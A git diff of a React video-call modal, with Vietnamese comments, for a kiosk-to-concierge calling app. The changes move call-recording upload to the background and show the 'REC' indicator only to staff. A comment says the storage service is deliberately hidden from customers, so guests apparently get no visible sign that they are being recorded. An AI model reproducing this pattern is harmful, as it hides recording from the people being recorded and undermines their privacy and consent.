@@ -67,6 +67,7 @@ export const MessengerVideoCallModal = ({
   const callStartTimeRef = useRef(null);
   const timerIntervalRef = useRef(null);
   const iceCandidatesQueueRef = useRef([]);
+  const isEndingRef = useRef(false);
 
   // 1. Tạo Canvas Stream giả lập trong trường hợp máy tính KHÔNG CÓ WEBCAM
   const createFakeVideoStream = (label = 'Audio Only') => {
@@ -178,39 +179,33 @@ export const MessengerVideoCallModal = ({
     }
   };
 
-  // 4. Dừng ghi hình và tự động upload lên Cloudinary
+  // 4. Dừng ghi hình và tự động lưu trong nền (Hoàn toàn ẩn không hiển thị Cloudinary cho khách)
   const stopRecordingAndUpload = async () => {
     if (timerIntervalRef.current) clearInterval(timerIntervalRef.current);
 
     if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
-      mediaRecorderRef.current.stop();
+      try {
+        mediaRecorderRef.current.stop();
+      } catch (e) {}
     }
 
     // Đợi 300ms gom chunk cuối
-    await new Promise((resolve) => setTimeout(resolve, 400));
+    await new Promise((resolve) => setTimeout(resolve, 300));
 
     if (recordedChunksRef.current.length > 0) {
-      setCallStatus('uploading');
       const blob = new Blob(recordedChunksRef.current, { type: 'video/webm' });
       const durationSec = recordingDuration;
       const startedAt = callStartTimeRef.current;
       const endedAt = new Date().toISOString();
 
-      try {
-        const uploadRes = await uploadCallRecording(sessionId, blob, durationSec, startedAt, endedAt);
-        setUploadStatus({
-          success: true,
-          url: uploadRes.recording_url,
-          message: uploadRes.message || 'Đã lưu bản ghi cuộc gọi lên Cloudinary!',
+      // Upload chạy ngầm không chặn giao diện và không lộ tên dịch vụ lưu trữ
+      uploadCallRecording(sessionId, blob, durationSec, startedAt, endedAt)
+        .then((uploadRes) => {
+          onCallEnded(uploadRes);
+        })
+        .catch((upErr) => {
+          console.warn('[VideoCall] Background upload notice:', upErr);
         });
-        onCallEnded(uploadRes);
-      } catch (upErr) {
-        console.error('[VideoCall] Lỗi upload record:', upErr);
-        setUploadStatus({
-          success: false,
-          message: 'Lỗi upload lên Cloudinary: ' + upErr.message,
-        });
-      }
     }
   };
 
@@ -358,7 +353,8 @@ export const MessengerVideoCallModal = ({
                 iceCandidatesQueueRef.current.push(data.candidate);
               }
             }
-          } else if (data.type === 'call_end') {
+          } else if (data.type === 'call_end' || data.type === 'peer_disconnected') {
+            console.log('[VideoCall] Đối phương đã kết thúc cuộc gọi:', data.type);
             handleEndCall(false);
           }
         } catch (msgErr) {
@@ -382,6 +378,7 @@ export const MessengerVideoCallModal = ({
   // Khởi động khi modal mở
   useEffect(() => {
     if (isOpen) {
+      isEndingRef.current = false;
       setCallStatus('calling');
       setRecordingDuration(0);
       setUploadStatus(null);
@@ -406,18 +403,25 @@ export const MessengerVideoCallModal = ({
     }
 
     if (pcRef.current) {
-      pcRef.current.close();
+      try {
+        pcRef.current.close();
+      } catch (e) {}
       pcRef.current = null;
     }
 
     if (wsRef.current) {
-      wsRef.current.close();
+      try {
+        wsRef.current.close();
+      } catch (e) {}
       wsRef.current = null;
     }
   };
 
-  // Kết thúc cuộc gọi
-  const handleEndCall = async (notifyPeer = true) => {
+  // Kết thúc cuộc gọi (Đồng bộ ngắt kết nối lập tức cho cả 2 thiết bị)
+  const handleEndCall = (notifyPeer = true) => {
+    if (isEndingRef.current) return;
+    isEndingRef.current = true;
+
     if (notifyPeer && wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
       try {
         wsRef.current.send(JSON.stringify({ type: 'call_end' }));
@@ -425,12 +429,31 @@ export const MessengerVideoCallModal = ({
     }
 
     setCallStatus('ended');
-    await stopRecordingAndUpload();
 
+    // Dừng phát camera và micro ngay lập tức để tắt đèn thiết bị
+    if (localStreamRef.current) {
+      localStreamRef.current.getTracks().forEach((track) => track.stop());
+    }
+
+    // Dừng ghi hình và upload trong nền ngầm
+    stopRecordingAndUpload();
+
+    // Tự động đóng modal sau 1.2s hiển thị thông báo kết thúc
     setTimeout(() => {
       cleanUpResources();
       onClose();
-    }, 2000);
+    }, 1200);
+  };
+
+  // Bật/tắt Loa (Âm thanh từ đối phương)
+  const toggleSpeaker = () => {
+    setIsSpeakerMuted((prev) => {
+      const next = !prev;
+      if (remoteVideoRef.current) {
+        remoteVideoRef.current.muted = next;
+      }
+      return next;
+    });
   };
 
   // Bật/tắt Mic
@@ -479,14 +502,14 @@ export const MessengerVideoCallModal = ({
   return (
     <div
       ref={modalContainerRef}
-      className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-md transition-all duration-300"
+      className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-black/85 backdrop-blur-md transition-all duration-300 p-0 md:p-6"
     >
       {/* Video Call Modal Window */}
-      <div className="relative w-full h-full md:max-w-4xl md:h-[600px] bg-neutral-900 md:rounded-2xl overflow-hidden shadow-2xl border border-neutral-800 flex flex-col">
+      <div className="relative w-full h-[100dvh] md:h-[620px] md:max-w-4xl bg-neutral-900 md:rounded-2xl overflow-hidden shadow-2xl border border-neutral-800 flex flex-col">
         {/* TOP BAR */}
         <div className="absolute top-0 left-0 right-0 z-20 flex items-center justify-between p-4 bg-gradient-to-b from-black/80 via-black/40 to-transparent">
           <div className="flex items-center gap-3">
-            <div className="w-10 h-10 rounded-full bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center text-emerald-400 font-bold">
+            <div className="w-10 h-10 rounded-full bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center text-emerald-400 font-bold shrink-0">
               <User className="w-5 h-5" />
             </div>
             <div>
@@ -502,24 +525,38 @@ export const MessengerVideoCallModal = ({
                 <span>{roomNumber}</span>
                 <span>•</span>
                 <span className="text-emerald-400 flex items-center gap-1">
-                  <ShieldCheck className="w-3 h-3" /> Đường truyền mã hóa P2P
+                  <ShieldCheck className="w-3 h-3" /> Trực tuyến P2P
                 </span>
               </div>
             </div>
           </div>
 
           <div className="flex items-center gap-2">
-            {/* RECORDING BADGE */}
-            {isRecording && callStatus === 'connected' && (
-              <div className="flex items-center gap-1.5 px-3 py-1 rounded-full bg-red-500/20 border border-red-500/50 text-red-400 text-xs font-mono font-semibold animate-pulse">
-                <Disc className="w-3.5 h-3.5" />
-                <span>REC {formatTime(recordingDuration)}</span>
+            {/* CALL DURATION BADGE */}
+            {callStatus === 'connected' && (
+              <div
+                className={`flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-mono font-semibold ${
+                  role === 'staff'
+                    ? 'bg-red-500/20 border border-red-500/50 text-red-400'
+                    : 'bg-emerald-500/20 border border-emerald-500/40 text-emerald-300'
+                }`}
+              >
+                <span
+                  className={`w-2 h-2 rounded-full ${
+                    role === 'staff' ? 'bg-red-500 animate-pulse' : 'bg-emerald-400'
+                  }`}
+                />
+                <span>
+                  {role === 'staff'
+                    ? `REC ${formatTime(recordingDuration)}`
+                    : formatTime(recordingDuration)}
+                </span>
               </div>
             )}
 
             <button
               onClick={toggleFullscreen}
-              className="p-2 rounded-full bg-neutral-800/80 hover:bg-neutral-700 text-neutral-300 transition-all"
+              className="p-2 rounded-full bg-neutral-800/80 hover:bg-neutral-700 text-neutral-300 transition-all cursor-pointer"
               title="Toàn màn hình"
             >
               {isFullscreen ? <Minimize2 className="w-4 h-4" /> : <Maximize2 className="w-4 h-4" />}
@@ -541,8 +578,8 @@ export const MessengerVideoCallModal = ({
           />
 
           {/* CALLING / RINGING / CONNECTING OVERLAY */}
-          {callStatus !== 'connected' && (
-            <div className="absolute inset-0 flex flex-col items-center justify-center p-6 text-center z-10">
+          {callStatus !== 'connected' && callStatus !== 'ended' && (
+            <div className="absolute inset-0 flex flex-col items-center justify-center p-6 text-center z-10 bg-neutral-950/90">
               <div className="relative mb-6">
                 <div className="w-24 h-24 rounded-full bg-emerald-500/20 border-2 border-emerald-500/40 flex items-center justify-center text-emerald-400 animate-pulse">
                   <PhoneCall className="w-10 h-10 animate-bounce" />
@@ -552,12 +589,14 @@ export const MessengerVideoCallModal = ({
               </div>
 
               <h2 className="text-white text-lg font-bold mb-1">
-                {role === 'guest' ? 'Đang kết nối tới Tổng Đài Concierge...' : 'Cuộc gọi đến từ Robot Kiosk...'}
+                {role === 'guest'
+                  ? 'Đang kết nối tới Tổng Đài Concierge...'
+                  : 'Cuộc gọi đến từ Robot Kiosk...'}
               </h2>
               <p className="text-neutral-400 text-xs max-w-sm mb-4">
                 {hasNoCamera
-                  ? 'Máy tính không có camera vật lý. Hệ thống đã kích hoạt chế độ Thoại 2 chiều và Avatar ảo.'
-                  : 'Hệ thống đang thiết lập luồng WebRTC Peer-to-Peer và sẵn sàng ghi hình cuộc gọi...'}
+                  ? 'Thiết bị không có camera vật lý. Hệ thống tự động kích hoạt chế độ Thoại 2 chiều.'
+                  : 'Đang kết nối tín hiệu video call độ trễ thấp...'}
               </p>
 
               {errorMessage && (
@@ -569,39 +608,21 @@ export const MessengerVideoCallModal = ({
             </div>
           )}
 
-          {/* UPLOADING TO CLOUDINARY OVERLAY */}
-          {callStatus === 'uploading' && (
-            <div className="absolute inset-0 z-30 bg-black/90 flex flex-col items-center justify-center p-6 text-center">
-              <div className="w-12 h-12 border-3 border-emerald-500 border-t-transparent rounded-full animate-spin mb-4" />
-              <h3 className="text-white text-sm font-bold">Đang lưu bản ghi cuộc gọi lên Cloudinary...</h3>
-              <p className="text-neutral-400 text-xs mt-1">
-                File video đang được đóng gói và cập nhật vào CSDL HumanSupportSession.
+          {/* CALL ENDED OVERLAY (KHÔNG HIỆN THỊ CLOUDINARY CHO KHÁCH HÀNG) */}
+          {callStatus === 'ended' && (
+            <div className="absolute inset-0 z-30 bg-black/90 flex flex-col items-center justify-center p-6 text-center animate-fadeIn">
+              <div className="w-16 h-16 rounded-full bg-neutral-800 border border-neutral-700 flex items-center justify-center text-red-400 mb-4 shadow-xl">
+                <PhoneOff className="w-8 h-8" />
+              </div>
+              <h3 className="text-white text-base font-bold">Cuộc gọi đã kết thúc</h3>
+              <p className="text-neutral-400 text-xs mt-1.5">
+                Cảm ơn bạn đã liên hệ bộ phận Trợ lý Concierge.
               </p>
             </div>
           )}
 
-          {/* UPLOAD SUCCESS / RESULT NOTICE */}
-          {uploadStatus && (
-            <div className="absolute top-20 left-4 right-4 z-30 p-3 rounded-xl bg-neutral-900/90 border border-emerald-500/50 flex items-center gap-3 backdrop-blur-md">
-              <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0" />
-              <div className="flex-1 text-left">
-                <div className="text-xs font-bold text-white">{uploadStatus.message}</div>
-                {uploadStatus.url && (
-                  <a
-                    href={uploadStatus.url}
-                    target="_blank"
-                    rel="noreferrer"
-                    className="text-[11px] text-emerald-400 hover:underline truncate block"
-                  >
-                    Xem video: {uploadStatus.url}
-                  </a>
-                )}
-              </div>
-            </div>
-          )}
-
           {/* PICTURE-IN-PICTURE: LOCAL SELF VIDEO */}
-          <div className="absolute bottom-24 right-4 w-32 h-44 md:w-44 md:h-60 rounded-xl overflow-hidden bg-neutral-900 border-2 border-neutral-700/80 shadow-2xl z-20 transition-all hover:scale-105">
+          <div className="absolute bottom-28 right-4 w-32 h-44 md:w-44 md:h-60 rounded-xl overflow-hidden bg-neutral-900 border-2 border-neutral-700/80 shadow-2xl z-20 transition-all hover:scale-105">
             <video
               ref={localVideoRef}
               autoPlay
@@ -621,55 +642,106 @@ export const MessengerVideoCallModal = ({
           </div>
         </div>
 
-        {/* BOTTOM ACTION CONTROLS BAR (MESSENGER DOCK) */}
-        <div className="p-4 bg-neutral-900/95 border-t border-neutral-800/80 flex items-center justify-center gap-4 z-20">
-          {/* MUTE MIC BUTTON */}
-          <button
-            onClick={toggleMic}
-            className={`p-3.5 rounded-full transition-all duration-200 ${
-              isMicMuted
-                ? 'bg-red-500/20 text-red-400 border border-red-500/40 hover:bg-red-500/30'
-                : 'bg-neutral-800 hover:bg-neutral-700 text-white'
-            }`}
-            title={isMicMuted ? 'Bật Mic' : 'Tắt Mic'}
-          >
-            {isMicMuted ? <MicOff className="w-5 h-5" /> : <Mic className="w-5 h-5" />}
-          </button>
+        {/* BOTTOM ACTION CONTROLS BAR (FACETIME / MESSENGER STYLE DOCK) */}
+        <div className="px-4 py-3 pb-[max(1.25rem,env(safe-area-inset-bottom))] bg-neutral-900/98 border-t border-neutral-800/80 flex items-center justify-center gap-6 sm:gap-10 z-30 shrink-0 backdrop-blur-md">
+          {/* STAFF ONLY CONTROLS: BẬT/TẮT MIC, CAM, LOA */}
+          {role === 'staff' && (
+            <>
+              {/* MUTE MIC BUTTON */}
+              <button
+                type="button"
+                onClick={toggleMic}
+                className="flex flex-col items-center gap-1.5 focus:outline-none cursor-pointer group"
+              >
+                <div
+                  className={`w-12 h-12 rounded-full flex items-center justify-center transition-all ${
+                    isMicMuted
+                      ? 'bg-red-500/20 text-red-400 border border-red-500/50 shadow-lg shadow-red-500/20 scale-105'
+                      : 'bg-neutral-800 hover:bg-neutral-700 text-white border border-neutral-700/60'
+                  }`}
+                >
+                  {isMicMuted ? <MicOff className="w-5 h-5" /> : <Mic className="w-5 h-5" />}
+                </div>
+                <span
+                  className={`text-[11px] font-medium transition-colors ${
+                    isMicMuted ? 'text-red-400 font-semibold' : 'text-neutral-400 group-hover:text-neutral-200'
+                  }`}
+                >
+                  {isMicMuted ? 'Bật Mic' : 'Tắt Mic'}
+                </span>
+              </button>
 
-          {/* TOGGLE VIDEO BUTTON */}
-          <button
-            onClick={toggleVideo}
-            className={`p-3.5 rounded-full transition-all duration-200 ${
-              isVideoDisabled
-                ? 'bg-red-500/20 text-red-400 border border-red-500/40 hover:bg-red-500/30'
-                : 'bg-neutral-800 hover:bg-neutral-700 text-white'
-            }`}
-            title={isVideoDisabled ? 'Bật Camera' : 'Tắt Camera'}
-          >
-            {isVideoDisabled ? <VideoOff className="w-5 h-5" /> : <Video className="w-5 h-5" />}
-          </button>
+              {/* TOGGLE VIDEO BUTTON */}
+              <button
+                type="button"
+                onClick={toggleVideo}
+                className="flex flex-col items-center gap-1.5 focus:outline-none cursor-pointer group"
+              >
+                <div
+                  className={`w-12 h-12 rounded-full flex items-center justify-center transition-all ${
+                    isVideoDisabled
+                      ? 'bg-red-500/20 text-red-400 border border-red-500/50 shadow-lg shadow-red-500/20 scale-105'
+                      : 'bg-neutral-800 hover:bg-neutral-700 text-white border border-neutral-700/60'
+                  }`}
+                >
+                  {isVideoDisabled ? <VideoOff className="w-5 h-5" /> : <Video className="w-5 h-5" />}
+                </div>
+                <span
+                  className={`text-[11px] font-medium transition-colors ${
+                    isVideoDisabled ? 'text-red-400 font-semibold' : 'text-neutral-400 group-hover:text-neutral-200'
+                  }`}
+                >
+                  {isVideoDisabled ? 'Bật Cam' : 'Tắt Cam'}
+                </span>
+              </button>
 
-          {/* TOGGLE SPEAKER MUTE */}
-          <button
-            onClick={() => setIsSpeakerMuted(!isSpeakerMuted)}
-            className={`p-3.5 rounded-full transition-all duration-200 ${
-              isSpeakerMuted
-                ? 'bg-amber-500/20 text-amber-400 border border-amber-500/40'
-                : 'bg-neutral-800 hover:bg-neutral-700 text-white'
-            }`}
-            title={isSpeakerMuted ? 'Bật Loa' : 'Tắt Loa'}
-          >
-            {isSpeakerMuted ? <VolumeX className="w-5 h-5" /> : <Volume2 className="w-5 h-5" />}
-          </button>
+              {/* TOGGLE SPEAKER BUTTON */}
+              <button
+                type="button"
+                onClick={toggleSpeaker}
+                className="flex flex-col items-center gap-1.5 focus:outline-none cursor-pointer group"
+              >
+                <div
+                  className={`w-12 h-12 rounded-full flex items-center justify-center transition-all ${
+                    isSpeakerMuted
+                      ? 'bg-amber-500/20 text-amber-400 border border-amber-500/50 shadow-lg shadow-amber-500/20 scale-105'
+                      : 'bg-neutral-800 hover:bg-neutral-700 text-white border border-neutral-700/60'
+                  }`}
+                >
+                  {isSpeakerMuted ? <VolumeX className="w-5 h-5" /> : <Volume2 className="w-5 h-5" />}
+                </div>
+                <span
+                  className={`text-[11px] font-medium transition-colors ${
+                    isSpeakerMuted ? 'text-amber-400 font-semibold' : 'text-neutral-400 group-hover:text-neutral-200'
+                  }`}
+                >
+                  {isSpeakerMuted ? 'Bật Loa' : 'Tắt Loa'}
+                </span>
+              </button>
+            </>
+          )}
 
-          {/* END CALL BUTTON (RED HANGUP) */}
+          {/* END CALL BUTTON (RED HANGUP - HIỂN THỊ CẢ 2 BÊN) */}
           <button
+            type="button"
             onClick={() => handleEndCall(true)}
-            className="px-6 py-3.5 rounded-full bg-red-600 hover:bg-red-700 active:scale-95 text-white font-bold flex items-center gap-2 shadow-lg shadow-red-600/30 transition-all"
-            title="Kết thúc cuộc gọi"
+            className="flex flex-col items-center gap-1.5 focus:outline-none cursor-pointer active:scale-95 transition-transform group"
           >
-            <PhoneOff className="w-5 h-5" />
-            <span className="text-xs hidden sm:inline">Kết thúc & Lưu Record</span>
+            <div
+              className={`rounded-full bg-red-600 hover:bg-red-700 flex items-center justify-center text-white shadow-lg shadow-red-600/40 border border-red-500 transition-all ${
+                role === 'guest' ? 'px-8 py-3.5 gap-2.5' : 'w-12 h-12'
+              }`}
+            >
+              <PhoneOff className="w-5 h-5" />
+              {role === 'guest' && (
+                <span className="text-xs font-bold tracking-wide">Kết thúc cuộc gọi</span>
+              )}
+            </div>
+            {role === 'staff' && (
+              <span className="text-[11px] font-bold text-red-400 group-hover:text-red-300">
+                Kết thúc
+              </span>
+            )}
           </button>
         </div>
       </div>
